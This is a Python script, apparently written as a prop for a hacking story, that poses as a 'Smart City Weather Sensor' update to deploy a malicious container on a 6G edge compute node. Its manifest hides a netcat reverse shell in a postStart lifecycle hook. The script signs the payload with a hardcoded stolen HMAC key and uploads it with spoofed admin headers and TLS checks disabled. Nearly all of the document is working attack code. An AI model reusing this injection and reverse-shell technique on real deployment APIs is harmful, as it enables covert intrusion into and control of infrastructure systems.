import requests     # Real library for HTTP requests
import json         # Real library for data formatting
import hashlib      # Real library for hashing
import hmac         # Real library for message signatures
import time



#This script disguises a malicious software container as a legitimate "Smart City Weather Sensor" 
#update and uploads it to the tower. Once installed, the code runs inside the tower, 
#allowing the hacker to spy on local traffic from within.

# ==============================================================================
# TARGET: 6G EDGE COMPUTE NODE (The Cell Tower)
# ==============================================================================
# 6G towers run "Micro-Services." We connect to the management API.
TARGET_URL = "https://[2001:db8::1]:8443/api/v2/edge/deploy"

# We pretend to be a boring municipal service to avoid suspicion
FAKE_SERVICE_ID = "MUNI_WEATHER_SENSOR_v4.2"

# ==============================================================================
# PHASE 1: CRAFT THE MALICIOUS CONTAINER MANIFEST
# ==============================================================================
def build_parasite_manifest():
    """
    Creates a JSON configuration file that looks like a sensor update 
    but contains our malicious code execution instructions.
    """
    print("[*] Compiling container manifest...")
    
    # This looks like a standard Kubernetes/Docker config file (Real tech)
    manifest = {
        "service_name": FAKE_SERVICE_ID,
        "priority": "LOW_LATENCY",
        "cpu_limit": "2.0",
        "image": "registry.city-infra.net/sensors/weather:latest", 
        
        # THE TRAP: We inject a "Post-Start" command. 
        # When the tower starts this legitimate 'weather' program, 
        # it also accidentally runs our reverse shell in the background.
        "lifecycle": {
            "postStart": {
                "exec": {
                    "command": ["/bin/sh", "-c", "nc -e /bin/sh 192.168.0.5 4444"]
                }
            }
        }
    }
    return manifest

# ==============================================================================
# PHASE 2: FORGE THE DIGITAL SIGNATURE (HMAC)
# ==============================================================================
def sign_request(payload_string):
    """
    The tower requires a valid signature. We use a stolen API key 
    to sign our malicious payload using HMAC-SHA256.
    """
    print("[*] Forging cryptographic signature...")
    
    # In the story, this key was found in a discarded maintenance tablet
    stolen_key = b"x8z-ADMIN-KEY-9921" 
    
    # Create a real HMAC signature
    signature = hmac.new(
        stolen_key, 
        payload_string.encode('utf-8'), 
        hashlib.sha256
    ).hexdigest()
    
    return signature

# ==============================================================================
# PHASE 3: UPLOAD TO THE EDGE
# ==============================================================================
def deploy_parasite():
    # 1. Build Payload
    payload_data = build_parasite_manifest()
    json_payload = json.dumps(payload_data)
    
    # 2. Sign Payload
    auth_token = sign_request(json_payload)
    
    # 3. Construct Headers
    # We add headers to look like a legitimate system administrator tool
    headers = {
        "Content-Type": "application/json",
        "X-Edge-Auth-Signature": auth_token,
        "User-Agent": "CitySysAdmin/6.0 (compatible; sys6g)"
    }
    
    print(f"[*] Uploading {len(json_payload)} bytes to Edge Node...")
    
    try:
        # SEND THE REQUEST (Real HTTP POST)
        # verify=False ignores SSL warnings (common in hacking scripts)
        response = requests.post(
            TARGET_URL, 
            data=json_payload, 
            headers=headers, 
            verify=False,
            timeout=5
        )
        
        # CHECK RESPONSE
        if response.status_code == 201:
            print("[+] SUCCESS: Parasite container deployed.")
            print(f"[+] Node Response: {response.json().get('status')}")
            print("[*] Waiting for reverse shell connection...")
        else:
            print(f"[-] FAILED: Server returned {response.status_code}")
            print(f"[-] Error: {response.text}")
            
    except requests.exceptions.ConnectionError:
        print("[!] CONNECTION ERROR: Target node is unreachable or shielded.")

# ==============================================================================
# EXECUTION
# ==============================================================================
if __name__ == "__main__":
    print("--- 6G EDGE INJECTOR TOOL ---")
    deploy_parasite()